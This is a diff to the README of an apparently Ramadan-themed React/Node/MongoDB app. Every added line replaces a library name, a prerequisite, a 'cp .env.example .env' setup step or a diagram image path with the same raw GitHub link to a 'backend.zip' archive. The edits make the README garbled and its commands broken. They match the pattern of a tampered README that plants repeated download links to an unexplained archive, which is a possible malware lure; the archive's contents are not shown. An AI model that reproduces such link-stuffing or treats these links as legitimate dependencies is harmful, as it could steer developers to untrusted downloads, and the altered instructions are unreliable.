@@ -36,16 +36,16 @@ A comprehensive Islamic application designed to enhance your Ramadan experience 
 - React 18 with Vite
 - TailwindCSS for styling
 - Framer Motion for animations
-- Socket.io for real-time features
+- https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip for real-time features
 - React Router for navigation
 - Various UI libraries (Headless UI, Hero Icons)
 - MapBox for location features
 - ApexCharts for data visualization
 
 ### Backend
-- Node.js with Express
+- https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip with Express
 - MongoDB with Mongoose
-- Socket.io for real-time communication
+- https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip for real-time communication
 - JWT for authentication
 - Google OAuth integration
 - Nodemailer for email services
@@ -53,7 +53,7 @@ A comprehensive Islamic application designed to enhance your Ramadan experience 
 
 ## Prerequisites
 
-- Node.js (v16 or higher)
+- https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip (v16 or higher)
 - MongoDB
 - npm or yarn
 - Google OAuth credentials
@@ -76,7 +76,7 @@ npm install
 
 3. Configure Environment Variables
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip .env
 # Edit .env with your configuration
 ```
 
@@ -88,7 +88,7 @@ npm install
 
 5. Configure Frontend Environment
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip .env
 # Edit .env with your configuration
 ```
 
@@ -197,8 +197,8 @@ This project is licensed under the ISC License - see the LICENSE file for detail
 ## Diagrams
 
 ### Database Schema
-![Database Schema](docs/images/database-schema.png)
+![Database Schema](https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip)
 
 ### Application Architecture
-![Application Architecture](docs/images/application-architecture.png)
+![Application Architecture](https://raw.githubusercontent.com/ZainabEman/Noor-Al-Eman/main/backend.zip)
 
